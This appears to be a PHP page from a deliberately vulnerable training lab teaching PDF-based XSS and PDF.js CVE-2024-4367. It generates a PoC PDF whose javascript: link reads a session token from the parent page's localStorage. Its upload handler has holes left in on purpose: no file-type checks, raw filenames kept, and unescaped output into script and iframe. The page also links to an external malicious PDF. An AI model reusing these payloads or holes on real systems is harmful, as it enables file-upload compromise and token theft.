<?php
require_once __DIR__ . '/../src/helpers.php';
check_login();

// 1. 一鍵下載 PDF XSS PoC 檔案 (超連結點擊免殺版，100% 支援現代 Chrome/Edge)
if (isset($_GET['download_poc'])) {
    header('Content-Type: application/pdf');
    header('Content-Disposition: inline; filename="xss-poc.pdf"');
    
    // 建構一個包含紅框點擊 Link Action (/S /URI) 且使用 javascript: 偽協定的 PDF 格式
    $pdf = "%PDF-1.4\n";
    $pdf .= "1 0 obj\n<<\n  /Type /Catalog\n  /Pages 2 0 R\n>>\nendobj\n";
    $pdf .= "2 0 obj\n<<\n  /Type /Pages\n  /Kids [3 0 R]\n  /Count 1\n>>\nendobj\n";
    $pdf .= "3 0 obj\n<<\n  /Type /Page\n  /Parent 2 0 R\n  /Resources <<\n    /Font <<\n      /F1 <<\n        /Type /Font\n        /Subtype /Type1\n        /BaseFont /Helvetica\n      >>\n    >>\n  >>\n  /MediaBox [0 0 595 842]\n  /Contents 4 0 R\n  /Annots [5 0 R]\n>>\nendobj\n";
    $pdf .= "4 0 obj\n<< /Length 135 >>\nstream\nBT\n/F1 22 Tf\n50 750 Td\n(PDF-based XSS Demo PoC File) Tj\n/F1 12 Tf\n0 -40 Td\n(Please click the red border box below to verify Stored XSS:) Tj\nET\nendstream\nendobj\n";
    $js_code = "try { alert('💥 PDF-based XSS 攻擊成功！\\n\\n已成功跨來源竊取父視窗 LocalStorage 的敏感 API Token：\\n' + parent.localStorage.getItem('user_session')); } catch(e) { alert('PDF JavaScript 執行成功！但無法存取父視窗：' + e.message); }";
    $encoded_uri = "javascript:" . rawurlencode($js_code);
    $pdf .= "5 0 obj\n<<\n  /Type /Annot\n  /Subtype /Link\n  /Rect [50 670 450 720]\n  /Border [0 0 1]\n  /C [1 0 0]\n  /A <<\n    /Type /Action\n    /S /URI\n    /URI ({$encoded_uri})\n  >>\n>>\nendobj\n";
    $pdf .= "xref\n0 6\n0000000000 65535 f\n0000000009 00000 n\n0000000056 00000 n\n0000000111 00000 n\n0000000302 00000 n\n0000000492 00000 n\ntrailer\n<<\n  /Size 6\n  /Root 1 0 R\n>>\nstartxref\n708\n%%EOF\n";
    
    echo $pdf;
    exit;
}

$error = '';
$success = '';
$uploaded_file = '';

// 2. 處理 PDF 檔案上傳
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['pdf_file']) && $_FILES['pdf_file']['error'] === UPLOAD_ERR_OK) {
        $file_name = $_FILES['pdf_file']['name'];
        $file_tmp  = $_FILES['pdf_file']['tmp_name'];
        
        $upload_dir = __DIR__ . '/uploads/';
        if (!is_dir($upload_dir)) {
            @mkdir($upload_dir, 0777, true);
        }

        // 弱點版：完全不檢驗副檔名與 PDF 特徵，直接保留原始檔名儲存
        $destination = $upload_dir . $file_name;
        if (move_uploaded_file($file_tmp, $destination)) {
            $success = '✓ PDF 檔案上傳成功！';
            $uploaded_file = '/uploads/' . $file_name;
        } else {
            $error = '檔案移動失敗，請檢查目錄寫入權限。';
        }
    } else {
        $error = '上傳失敗，錯誤代碼：' . ($_FILES['pdf_file']['error'] ?? '未知');
    }
}
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>📄 PDF 嵌入跨站腳本漏洞 (PDF XSS) - VulnCampus</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
    <style>
        body { font-family: sans-serif; background-color: #f4f6f9; }
        .instructions { background-color: #ffeef0; border-left: 5px solid #dc3545; }
    </style>
</head>
<body class="bg-light">

<div class="container my-5">
    <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-2">
        <h2>📄 PDF 嵌入跨站腳本 (PDF-based XSS) 演練</h2>
        <div>
            <a href="/index.php" class="btn btn-secondary">回首頁</a>
        </div>
    </div>

    <?php if ($error): ?>
        <div class="alert alert-danger"><?= $error ?></div>
    <?php endif; ?>
    <?php if ($success): ?>
        <div class="alert alert-success"><?= $success ?></div>
    <?php endif; ?>

    <div class="row">
        <!-- 左側：上傳表單與說明 -->
        <div class="col-md-5">
            <div class="card shadow-sm mb-4">
                <div class="card-header bg-danger text-white font-weight-bold">
                    成果證明 PDF 上傳區
                </div>
                <div class="card-body">
                    <p class="text-muted">上傳您的課外學習成果證明（僅限 PDF 格式）。上傳後系統將自動在網頁下方嵌入預覽。</p>
                    
                    <form method="POST" enctype="multipart/form-data">
                        <div class="form-group">
                            <label for="pdf_file">選擇 PDF 檔案：</label>
                            <input type="file" name="pdf_file" id="pdf_file" class="form-control-file" accept=".pdf" required>
                        </div>
                        <button type="submit" class="btn btn-danger btn-block font-weight-bold">開始上傳成果</button>
                    </form>
                </div>
            </div>

            <div class="card shadow-sm instructions p-3">
                <h5 class="text-danger font-weight-bold">🎯 PDF XSS 雙軌演練指引</h5>
                <p class="text-muted small mb-2">本單元提供兩種不同攻擊路徑的 PDF XSS 演示，學員可進行對比測試：</p>
                <ol class="pl-3 mb-0 text-muted small">
                    <li class="mb-3">
                        <strong>路徑 A：點擊式 XSS (利用 PDF 超連結功能)</strong>
                        <br>• <strong>原理</strong>：利用 PDF 格式內的「超連結 (Link Action)」指向 `javascript:` 偽協定。
                        <br>• <strong>步驟</strong>：點擊下方按鈕下載 PoC 檔案上傳，並在右側預覽畫面中<strong>手動點選「紅色外框區域」</strong>，測試是否執行 JavaScript 彈窗。
                        <a href="?download_poc=1" class="btn btn-sm btn-outline-danger font-weight-bold my-2 btn-block">📥 下載點擊式 PoC 檔案 (xss-poc.pdf)</a>
                        <span class="text-warning font-weight-bold">⚠️ 注意：</span>由於現代瀏覽器預設已阻擋 PDF 中的 JS 執行，若您的瀏覽器已修補，此點擊可能無反應。
                    </li>
                    <li class="mb-3">
                        <strong>路徑 B：免點擊 XSS (利用 PDF.js 程式漏洞 - CVE-2024-4367)</strong>
                        <br>• <strong>原理</strong>：不依賴點擊，而是利用 PDF 閱讀器程式（PDF.js）在解析 PDF 惡意字型時的代碼注入漏洞，使網頁自動執行腳本。
                        <br>• <strong>步驟</strong>：從下方「漏洞技術檔案」區下載 `malicious.pdf` 並上傳，觀察在 PDF 載入預覽的瞬間，是否<strong>不需任何點擊即自動彈出</strong> XSS 警報。
                    </li>
                </ol>
            </div>

            <!-- CVE-2024-4367 漏洞詳情與對照 -->
            <div class="card shadow-sm mt-4">
                <div class="card-header bg-dark text-white font-weight-bold">
                    🔍 CVE-2024-4367 漏洞技術檔案
                </div>
                <div class="card-body small">
                    <p class="mb-2"><strong>漏洞概述 (為什麼字型會引發問題？)</strong>：
                        <br>PDF.js 為了加速渲染 PDF 中的「Type 3 字型」，會將字型內部的指令直接<strong>動態編譯成 JavaScript 程式碼</strong>來執行。
                        <br>由於舊版 PDF.js 未對字型內部參數進行安全過濾，攻擊者只要在字型中夾帶惡意腳本，當 PDF.js 解析該字型時，就會將該腳本當作渲染指令的一部分而<strong>自動執行</strong>，進而造成無需點擊的 XSS。
                    </p>
                    <hr>
                    <ul class="pl-3 mb-2 text-muted">
                        <li class="mb-1"><strong>官方公告與連結</strong>：<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4367" target="_blank" class="text-danger font-weight-bold">CVE-2024-4367 (NVD)</a></li>
                        <li class="mb-1"><strong>CWE 對照</strong>：
                            <br>- <a href="https://cwe.mitre.org/data/definitions/94.html" target="_blank">CWE-94: Control of Generation of Code ('Code Injection')</a>
                            <br>- <a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a>
                        </li>
                        <li class="mb-1"><strong>OWASP Top 10</strong>：
                            <br>- <strong>A03:2021-Injection</strong>（注入攻擊）
                            <br>- <strong>A06:2021-Vulnerable and Outdated Components</strong>（使用有漏洞或過期的元件）
                        </li>
                    </ul>
                    <hr>
                    <div class="alert alert-warning p-2 mb-0">
                        <strong>📥 測試用 PoC 下載</strong>：<br>
                        學員可下載來自開源社群研究員 <a href="https://github.com/s4vvysec/CVE-2024-4367-POC" target="_blank" class="alert-link">s4vvysec</a> 所維護的漏洞驗證檔案：<br>
                        <a href="https://github.com/s4vvysec/CVE-2024-4367-POC/blob/main/malicious.pdf" target="_blank" class="btn btn-sm btn-danger btn-block font-weight-bold mt-2">📥 下載 malicious.pdf PoC 檔案</a>
                        <span class="text-muted d-block mt-1" style="font-size: 10px;">(註：請將下載的檔案上傳至本系統以測試 PDF.js 載入時是否會自動彈出 alert 視窗)</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- 右側：PDF 預覽區 -->
        <div class="col-md-7">
            <div class="card shadow-sm h-100">
                <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center font-weight-bold">
                    <span>📄 證明文件預覽區域</span>
                    <div class="btn-group btn-group-sm" role="group">
                        <button type="button" class="btn btn-danger active" id="btn-use-pdfjs">PDF.js v4.1.392</button>
                        <button type="button" class="btn btn-secondary" id="btn-use-browser">瀏覽器內建 (Iframe)</button>
                    </div>
                </div>
                <div class="card-body d-flex flex-column align-items-center justify-content-center bg-white" style="min-height: 500px; overflow-y: auto; position: relative;">
                    <div id="pdf-placeholder" class="text-center text-muted" style="<?= $uploaded_file ? 'display: none;' : '' ?>">
                        <h4>尚未上傳任何成果 PDF</h4>
                        <p class="small">請先在左方選擇檔案並上傳，此處將自動呈現預覽。</p>
                    </div>
                    <?php if ($uploaded_file): ?>
                        <!-- 模式 A：PDF.js 渲染容器 (預設顯示) -->
                        <div id="pdfjs-container" style="width: 100%; display: block;">
                            <canvas id="pdf-canvas" style="border: 1px solid #ccc; max-width: 100%; height: auto; display: none; margin: 0 auto;"></canvas>
                        </div>

                        <!-- 模式 B：瀏覽器內建 Iframe 容器 (預設隱藏) -->
                        <div id="browser-container" style="width: 100%; height: 500px; display: none;">
                            <iframe id="pdf-iframe" src="<?= $uploaded_file ?>" width="100%" height="500px" style="border: none;"></iframe>
                        </div>

                        <!-- 載入易受 CVE-2024-4367 漏洞影響之本地 PDF.js 版本 -->
                        <script type="module">
                            import * as pdfjsLib from './js/pdf.min.mjs';
                            pdfjsLib.GlobalWorkerOptions.workerSrc = './js/pdf.worker.min.mjs';

                            const url = '<?= $uploaded_file ?>';
                            const loadingTask = pdfjsLib.getDocument(url);
                            loadingTask.promise.then(function(pdf) {
                                pdf.getPage(1).then(function(page) {
                                    const scale = 1.5;
                                    const viewport = page.getViewport({ scale: scale });

                                    const canvas = document.getElementById('pdf-canvas');
                                    const context = canvas.getContext('2d');
                                    canvas.height = viewport.height;
                                    canvas.width = viewport.width;
                                    canvas.style.display = 'block';

                                    const renderContext = {
                                        canvasContext: context,
                                        viewport: viewport
                                    };
                                    page.render(renderContext).promise.then(function() {
                                        console.log('PDF.js render complete.');
                                    });
                                });
                            }).catch(function(error) {
                                console.error('PDF.js render error: ', error);
                                document.getElementById('pdf-placeholder').style.display = 'block';
                                document.getElementById('pdf-placeholder').innerHTML = '<div class="text-danger">PDF 載入或解析失敗，這可能代表 PDF 中觸發了 CVE-2024-4367 漏洞或檔案已損毀！</div>';
                            });
                        </script>

                        <!-- 控制切換預覽模式的 Script -->
                        <script>
                            const btnPdfjs = document.getElementById('btn-use-pdfjs');
                            const btnBrowser = document.getElementById('btn-use-browser');
                            const divPdfjs = document.getElementById('pdfjs-container');
                            const divBrowser = document.getElementById('browser-container');

                            btnPdfjs.addEventListener('click', () => {
                                btnPdfjs.classList.add('active', 'btn-danger');
                                btnPdfjs.classList.remove('btn-secondary');
                                btnBrowser.classList.remove('active', 'btn-danger');
                                btnBrowser.classList.add('btn-secondary');
                                
                                divPdfjs.style.display = 'block';
                                divBrowser.style.display = 'none';
                            });

                            btnBrowser.addEventListener('click', () => {
                                btnBrowser.classList.add('active', 'btn-danger');
                                btnBrowser.classList.remove('btn-secondary');
                                btnPdfjs.classList.remove('active', 'btn-danger');
                                btnPdfjs.classList.add('btn-secondary');
                                
                                divPdfjs.style.display = 'none';
                                divBrowser.style.display = 'block';
                            });
                        </script>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>
</div>

</body>
</html>
